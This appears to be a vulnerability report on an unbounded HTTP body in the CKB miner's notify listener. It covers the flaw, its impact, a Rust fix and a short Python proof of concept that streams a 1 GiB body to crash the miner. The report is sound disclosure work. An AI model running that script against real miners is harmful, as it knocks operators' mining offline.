### Title
Unbounded HTTP Body Buffering in Miner Notify Listener Enables OOM via Unauthenticated Request — (`miner/src/client.rs`)

---

### Summary

The miner's block-template notify HTTP listener (`listen_block_template_notify`) accepts inbound TCP connections and passes each request directly to `BodyExt::collect(req).await?.aggregate()` with no body-size limit. An attacker who can reach the listen socket can stream an arbitrarily large HTTP body, causing the miner process to exhaust host memory (OOM), killing it and halting all block submissions to the CKB network.

---

### Finding Description

When the miner is configured in notify mode (`config.listen` is `Some(addr)`), `Client::spawn_background` spawns `listen_block_template_notify`, which binds a raw `TcpListener` and serves each accepted connection through hyper's `auto::Builder`: [1](#0-0) 

Every accepted connection is dispatched to the `handle` async function: [2](#0-1) 

The critical line is:

```rust
let body = BodyExt::collect(req).await?.aggregate();
```

`BodyExt::collect` reads **all** body frames from the incoming stream and accumulates them into a single in-memory buffer before `serde_json::from_reader` is ever called. There is no `http_body_util::Limited` wrapper, no `Content-Length` check, and no configurable `max_request_body_size` applied to this listener. A `grep` across all of `miner/src/` for any body-size guard returns zero matches.

This is in direct contrast to the CKB node's own RPC server, which enforces a hard `max_request_body_size` (default 10 MiB): [3](#0-2) [4](#0-3) 

The miner's notify listener has no equivalent protection.

---

### Impact Explanation

An attacker streams a multi-GB HTTP POST body to the miner's notify port. The miner process allocates memory proportional to the body size until the OS OOM-killer terminates it. With the miner dead, no new block templates are fetched and no solved blocks are submitted to the CKB network, effectively halting the operator's mining operation for the duration of the attack. The attack is repeatable: each time the miner is restarted, the attacker can reconnect and repeat.

---

### Likelihood Explanation

The miner's notify `listen` address is a `SocketAddr` chosen by the operator. If bound to `0.0.0.0:PORT` (common in pool/datacenter deployments where the CKB node and miner run on separate hosts), any network-reachable host can exploit this with a single TCP connection and a streaming HTTP body — no authentication, no PoW, no privileged access required. Even a `127.0.0.1`-bound address is reachable by any unprivileged local process on the same host. The attack requires only a TCP socket and the ability to write bytes.

---

### Recommendation

Wrap the incoming body with `http_body_util::Limited` before collecting, mirroring the guard used by the CKB node's RPC server:

```rust
use http_body_util::Limited;

async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    const MAX_BODY: u64 = 10 * 1024 * 1024; // 10 MiB, same as node RPC default
    let body = Limited::new(req, MAX_BODY)
        .collect()
        .await
        .map_err(|_| "body too large")?
        .aggregate();
    // ...
}
```

Additionally, consider binding the notify listener to `127.0.0.1` by default and documenting that exposing it to untrusted networks is unsafe.

---

### Proof of Concept

```python
import socket, time

HOST = "127.0.0.1"
PORT = 8119  # miner notify listen port from ckb-miner.toml

s = socket.create_connection((HOST, PORT))
# Send HTTP/1.1 POST with a 1 GB body declared via Content-Length
header = (
    "POST / HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Content-Type: application/json\r\n"
    "Content-Length: 1073741824\r\n"  # 1 GiB
    "\r\n"
).encode()
s.sendall(header)

chunk = b"A" * 65536
sent = 0
while sent < 1073741824:
    s.sendall(chunk)
    sent += len(chunk)

# Observe: miner RSS grows to ~1 GB, then process is OOM-killed.
# Block submissions cease until miner is manually restarted.
```

The miner process will buffer the entire body in `BodyExt::collect` before attempting JSON deserialization, growing RSS proportionally until the host OOM-killer intervenes. [2](#0-1)
